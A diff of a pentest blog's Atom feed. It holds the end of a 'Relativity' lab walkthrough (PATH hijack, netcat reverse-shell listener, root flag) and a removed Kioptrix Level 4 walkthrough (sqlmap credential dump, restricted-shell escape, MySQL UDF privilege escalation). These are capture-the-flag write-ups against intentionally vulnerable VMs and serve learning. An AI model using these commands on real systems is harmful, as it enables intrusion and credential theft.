+<p>I updated it with my host address and port, put it in a file named fortune, gave it permissions and updated  the  path to start looking in <em>/tmp/</em>:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>
+</span><span class='line'>[jetta@Relativity ~]$ chmod 777 /tmp/fortune
+</span><span class='line'>
+</span><span class='line'>[jetta@Relativity ~]$ export PATH="/tmp:$PATH"
+</span><span class='line'>
+</span><span class='line'>[jetta@Relativity ~]$ echo $PATH
+</span><span class='line'>/tmp:/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/jetta/.local/bin:/home/jetta/bin</span></code></pre></td></tr></table></div></figure>
+
+
+<p>On my machine I had netcat listen for connections:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# nc -vnlp 5555
+</span><span class='line'>nc: listening on :: 5555 ...
+</span><span class='line'>nc: listening on 0.0.0.0 5555 ...</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And now I ran <code>auth_server</code> again:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[jetta@Relativity ~]$ sudo /home/jetta/auth_server/auth_server
+</span><span class='line'>[+] Checking Certificates...done
+</span><span class='line'>[+] Contacting server, please wait...could not establish connection
+</span><span class='line'>error: (12)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And on my netcat side:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>sh-4.2# whoami
+</span><span class='line'>whoami
+</span><span class='line'>root
+</span><span class='line'>sh-4.2# cat /root/flag.txt
+</span><span class='line'>cat /root/flag.txt
+</span><span class='line'>65afa0e5928b98f7ae283e16df2d43bf</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Was curious about the hash, ran it in an online decrypter, the result was <em>sagishahar</em>.</p>
+
+<p>Markdown formatting was a pain in the ass for cowsay, so a slightly different fortune cookie format, but straight from the cow&rsquo;s mouth!</p>
+
+<p><img class="center" src="http://chousensha.github.io/images/pentest/relativity/cookie.png" title="cookie" alt="fortune cowsay"></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[Kali tools catalog - Wireless Attacks]]></title>
@@ -15891,288 +16453,6 @@ under the context of the web  server. Please note: authentication is not require
 <p>This concludes the Kioptrix series, and cheers to <strong>loneferret</strong> for creating these awesome challenges!</p>
 
 <blockquote><p>Today is the first day of the rest of the mess.</p></blockquote>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentest lab - Kioptrix Level 4]]></title>
-    <link href="http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4/"/>
-    <updated>2014-06-22T22:39:14+03:00</updated>
-    <id>http://chousensha.github.io/blog/2014/06/22/pentest-lab-kioptrix-level-4</id>
-    <content type="html"><![CDATA[<p>This is the final vulnerable machine in the Kioptrix series. To set it up in VMware, create a new virtual machine with the advanced options and use existing virtual disk, pointing it at the Kioptrix 4 virtual disk.</p>
-
-<!-- more -->
-
-
-<p>Let&rsquo;s see what Nmap reveals:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -A -p1-65535 192.168.127.129
-</span><span class='line'>
-</span><span class='line'>Starting Nmap 6.46 ( http://nmap.org ) at 2014-06-22 22:35 EEST
-</span><span class='line'>Nmap scan report for 192.168.127.129
-</span><span class='line'>Host is up (0.00074s latency).
-</span><span class='line'>Not shown: 39528 closed ports, 26003 filtered ports
-</span><span class='line'>PORT    STATE SERVICE     VERSION
-</span><span class='line'>22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
-</span><span class='line'>| ssh-hostkey: 
-</span><span class='line'>|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
-</span><span class='line'>|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
-</span><span class='line'>80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
-</span><span class='line'>|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
-</span><span class='line'>|_http-title: Site doesn't have a title (text/html).
-</span><span class='line'>139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-</span><span class='line'>MAC Address: 00:0C:29:1F:12:65 (VMware)
-</span><span class='line'>Device type: general purpose
-</span><span class='line'>Running: Linux 2.6.X
-</span><span class='line'>OS CPE: cpe:/o:linux:linux_kernel:2.6
-</span><span class='line'>OS details: Linux 2.6.9 - 2.6.33
-</span><span class='line'>Network Distance: 1 hop
-</span><span class='line'>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</span><span class='line'>
-</span><span class='line'>Host script results:
-</span><span class='line'>|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
-</span><span class='line'>| smb-os-discovery: 
-</span><span class='line'>|   OS: Unix (Samba 3.0.28a)
-</span><span class='line'>|   Computer name: Kioptrix4
-</span><span class='line'>|   NetBIOS computer name: 
-</span><span class='line'>|   Domain name: localdomain
-</span><span class='line'>|   FQDN: Kioptrix4.localdomain
-</span><span class='line'>|_  System time: 2014-06-22T18:36:57-04:00
-</span><span class='line'>| smb-security-mode: 
-</span><span class='line'>|   Account that was used for smb scripts: guest
-</span><span class='line'>|   User-level authentication
-</span><span class='line'>|   SMB Security: Challenge/response passwords supported
-</span><span class='line'>|_  Message signing disabled (dangerous, but default)
-</span><span class='line'>|_smbv2-enabled: Server doesn't support SMBv2 protocol</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Again, this seems to be a web based challenge. Navigating to the target website shows this:</p>
-
-<p><img class="center" src="http://chousensha.github.io/images/kio4.png" title="login" alt="login"></p>
-
-<p>Supplying a single quote in the password field gives an error, which nicely discloses the database end as being MySQL:</p>
-
-<p><em>Warning: mysql_num_rows(): supplied argument is not a valid MySQL result resource in /var/www/checklogin.php on line 28
-Wrong Username or Password</em></p>
-
-<p>Sqlmap to the rescue!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sqlmap -u "http://192.168.127.129/checklogin.php" --dbms=MySQL --level=5 --risk=3 --data="myusername=admin&mypassword=test" --dump
-</span><span class='line'>
-</span><span class='line'>Database: members
-</span><span class='line'>Table: members
-</span><span class='line'>[2 entries]
-</span><span class='line'>+----+----------+-----------------------+
-</span><span class='line'>| id | username | password              |
-</span><span class='line'>+----+----------+-----------------------+
-</span><span class='line'>| 1  | john     | MyNameIsJohn          |
-</span><span class='line'>| 2  | robert   | ADGAdsafdfwt4gadfga== |
-</span><span class='line'>+----+----------+-----------------------+</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Logging in with these credentials didn&rsquo;t yield anything though, all I could see was a member&rsquo;s control panel with no functionality. So I remembered the previous challenge that allowed SSH access, and tried to log in:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ssh john@192.168.127.129
-</span><span class='line'>The authenticity of host '192.168.127.129 (192.168.127.129)' can't be established.
-</span><span class='line'>RSA key fingerprint is 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e.
-</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
-</span><span class='line'>Warning: Permanently added '192.168.127.129' (RSA) to the list of known hosts.
-</span><span class='line'>john@192.168.127.129's password: 
-</span><span class='line'>Welcome to LigGoat Security Systems - We are Watching
-</span><span class='line'>== Welcome LigGoat Employee ==
-</span><span class='line'>LigGoat Shell is in place so you  don't screw up
-</span><span class='line'>Type '?' or 'help' to get the list of allowed commands
-</span><span class='line'>john:~$ </span></code></pre></td></tr></table></div></figure>
-
-
-<p>Excellent! It&rsquo;s time for some sniffing around. This is not a normal shell, usual commands don&rsquo;t work, so let&rsquo;s see what&rsquo;s available with the help system.</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>john:~$ help
-</span><span class='line'>cd  clear  echo  exit  help  ll  lpath  ls</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Hmm, not much. Actions are restricted too, can&rsquo;t <em>cd</em> to wherever I want:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>john:~$ cd /
-</span><span class='line'>*** forbidden path -&gt; "/"
-</span><span class='line'>*** You have 0 warning(s) left, before getting kicked out.
-</span><span class='line'>This incident has been reported.</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So I googled for a bit, and it appears this shell is a Python based limited shell (<a href="https://github.com/ghantoos/lshell">https://github.com/ghantoos/lshell</a>):</p>
-
-<blockquote><p>lshell is a shell coded in Python, that lets you restrict a user&rsquo;s environment to limited sets of commands, choose to enable/
-disable any command over SSH (e.g. SCP, SFTP, rsync, etc.), log user&rsquo;s commands, implement timing restriction, and more.</p></blockquote>
-
-<p>It is possible to escape from this shell by leveraging the <em>echo</em> command to call <em>os.system</em> in order to spawn a shell: <code>echo os.system(&lsquo;/bin/bash&rsquo;)</code></p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>john:~$ echo os.system('/bin/bash')
-</span><span class='line'>john@Kioptrix4:~$ id
-</span><span class='line'>uid=1001(john) gid=1001(john) groups=1001(john)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Poking around, I found the following information in <code>/var/www/john/john.php</code>:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>$host="localhost"; // Host name
-</span><span class='line'>$username="root"; // Mysql username
-</span><span class='line'>$password=""; // Mysql password</span></code></pre></td></tr></table></div></figure>
-
-
-<p>So, root doesn&rsquo;t have a password for MySQL? Let&rsquo;s check:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>john@Kioptrix4:/var/www/john$ mysql -u root -h localhost 
-</span><span class='line'>Welcome to the MySQL monitor.  Commands end with ; or \g.
-</span><span class='line'>Your MySQL connection id is 8
-</span><span class='line'>Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)
-</span><span class='line'>
-</span><span class='line'>Type 'help;' or '\h' for help. Type '\c' to clear the buffer.</span></code></pre></td></tr></table></div></figure>
-
-
-<p><a href="http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-windows-and-linux/">Here</a> I have found a way to get root privileges from a MySQL server running as root. Here&rsquo;s a quick summary:</p>
-
-<ul>
-<li><p>It is possible to escalate from MySQL server root level to system root by using User Defined Functions (UDF)</p></li>
-<li><p>We need the <a href="https://github.com/mysqludf/lib_mysqludf_sys">lib_mysqludf_sys.so</a> library that contains some useful functions that can interact with the OS. The most important ones are <strong>sys_exec</strong> (executes the command and returns the exit status) and <strong>sys_eval</strong> (executes the command and returns the standard output)</p></li>
-</ul>
-
-
-<p>The next step would be to find a way to get the library on the machine with our MySQL server. But that&rsquo;s not necessary in this case, because it&rsquo;s already on the server!</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>john@Kioptrix4:~$ whereis lib_mysqludf_sys.so
-</span><span class='line'>lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It took a bit of googling and trial and error until I found a way that worked in getting me to a root shell. <a href="http://superuser.com/questions/400723/how-do-i-create-a-superuser-from-the-command-line-in-ubuntu">Here</a> is a useful post. The relevant part for us is this:</p>
-
-<blockquote><p>Until Ubuntu 11.10, the Unix group for administrators with root privileges through sudo had been admin. Starting with Ubuntu
-12.04  LTS, it is now sudo, for compatibility with Debian and sudo itself. However, for backwards compatibility, admin group
-members are still recognized as administrators</p></blockquote>
-
-<p>So it is possible to make the john account to be part of the admin group, that is equivalent to the sudo group. So from the MySQL prompt, run this:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="k">SELECT</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;usermod -a -G admin&#39;</span><span class="p">);</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>What that does is it modifies john&rsquo;s account, appending it to the admin group. So let&rsquo;s do it on the MySQL command line:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="n">mysql</span><span class="o">&gt;</span> <span class="k">select</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;usermod -a -G admin john&#39;</span><span class="p">);</span>
-</span><span class='line'><span class="o">+</span><span class="c1">--------------------------------------+</span>
-</span><span class='line'><span class="o">|</span> <span class="n">sys_exec</span><span class="p">(</span><span class="s1">&#39;usermod -a -G admin john&#39;</span><span class="p">)</span> <span class="o">|</span>
-</span><span class='line'><span class="o">+</span><span class="c1">--------------------------------------+</span>
-</span><span class='line'><span class="o">|</span> <span class="k">NULL</span>                                 <span class="o">|</span>
-</span><span class='line'><span class="o">+</span><span class="c1">--------------------------------------+</span>
-</span><span class='line'><span class="mi">1</span> <span class="k">row</span> <span class="k">in</span> <span class="k">set</span> <span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">11</span> <span class="n">sec</span><span class="p">)</span>
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now from john&rsquo;s shell:</p>
-
-<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>john@Kioptrix4:~$ sudo su
-</span><span class='line'>[sudo] password for john: 
-</span><span class='line'>root@Kioptrix4:/home/john# whoami
-</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Awesome! We finally got root access! In root&rsquo;s directory there is another </code>congrats.txt</code> file that tells us there are at least 2 different tested ways to get root on this system. It sure was an interesting machine, and my favorite in the series, because it wasn&rsquo;t as straightforward as the others, and I had to look for more information and try (and fail) different approaches before I hit upon the winning one.</p>
-
-<p>Here&rsquo;s today&rsquo;s fortune cookie:</p>
-
-<blockquote><p>You single-handedly fought your way into this hopeless mess.</p></blockquote>
 ]]></content>
   </entry>
   
